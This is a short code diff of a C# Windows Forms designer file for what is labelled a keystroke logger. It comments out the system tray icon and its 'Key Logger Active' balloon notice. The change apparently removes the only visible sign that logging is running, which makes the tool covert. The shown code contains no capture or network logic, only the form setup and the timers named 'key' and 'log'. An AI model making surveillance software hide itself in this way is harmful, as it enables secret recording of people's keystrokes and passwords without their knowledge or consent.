@@ -31,7 +31,7 @@
             this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(InitalForm));
             this.button1 = new System.Windows.Forms.Button();
-            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+           // this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
             this.key = new System.Windows.Forms.Timer(this.components);
             this.log = new System.Windows.Forms.Timer(this.components);
             this.button2 = new System.Windows.Forms.Button();
@@ -55,12 +55,12 @@
             // 
             // notifyIcon1
             // 
-            this.notifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
-            this.notifyIcon1.BalloonTipText = "Key Logger Active";
-            this.notifyIcon1.BalloonTipTitle = "Key Stroke Logger";
-            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
-            this.notifyIcon1.Visible = true;
-            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
+            //this.notifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
+            //this.notifyIcon1.BalloonTipText = "Key Logger Active";
+            //this.notifyIcon1.BalloonTipTitle = "Key Stroke Logger";
+            //this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
+            //this.notifyIcon1.Visible = true;
+            //this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
             // 
             // key
             // 
